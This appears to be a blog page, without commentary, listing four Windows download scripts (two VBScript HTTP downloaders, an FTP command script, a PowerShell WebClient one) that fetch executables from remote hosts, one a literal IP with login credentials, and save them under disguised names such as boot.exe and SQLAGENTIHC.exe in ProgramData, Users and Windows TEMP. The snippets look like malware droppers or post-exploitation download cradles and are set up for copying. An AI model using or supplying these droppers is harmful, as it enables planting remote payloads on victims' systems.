<p>wget.vbs <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set x= createobject(&quot;microsoft.xmlhttp&quot;):x.open &quot;get&quot;,lcase(wscript.arguments(0)),0:x.send():set s = createobject(&quot;adodb.stream&quot;):s.mode = 3:s.type = 1:s.open():s.write(x.responsebody):s.savetofile lcase(wscript.arguments(1)),2 </span><br></pre></td></tr></table></figure> f2a.vbs <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Dim obj1,obj2 </span><br><span class="line">Dim url </span><br><span class="line">start = timer </span><br><span class="line">url = &quot;http://x.x.x.x/SQLAGENTIHC.exe&quot;   </span><br><span class="line">Set obj1 = CreateObject(&quot;msxml2.xmlhttp&quot;) </span><br><span class="line">Set obj2 = CreateObject(&quot;adodb.stream&quot;) </span><br><span class="line">obj1.open &quot;get&quot;,url,False </span><br><span class="line">obj1.send </span><br><span class="line">temp = obj1.responseBody </span><br><span class="line">obj2.Type = 1 </span><br><span class="line">obj2.Mode = 3 </span><br><span class="line">obj2.Open() </span><br><span class="line">obj2.Write(temp) </span><br><span class="line">obj2.SaveToFile &quot;C:\Users\AllUse~1\SQLAGENTIHC.exe&quot;,2 </span><br></pre></td></tr></table></figure> ftp.vbs <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">open 221.229.215.227</span><br><span class="line">110</span><br><span class="line">110</span><br><span class="line">get NDEServer.exe C:\ProgramData\boot.exe</span><br><span class="line">bye</span><br></pre></td></tr></table></figure>
download.ps1 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$client = New-Object System.Net.WebClient  </span><br><span class="line">$client.DownloadFile(&quot;http://9x.x.x.x/PL-0000-t.exe&quot;,&quot;C:\Windows\TEMP\KLPBO16A.exe&quot;)  </span><br></pre></td></tr></table></figure></p>

<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>
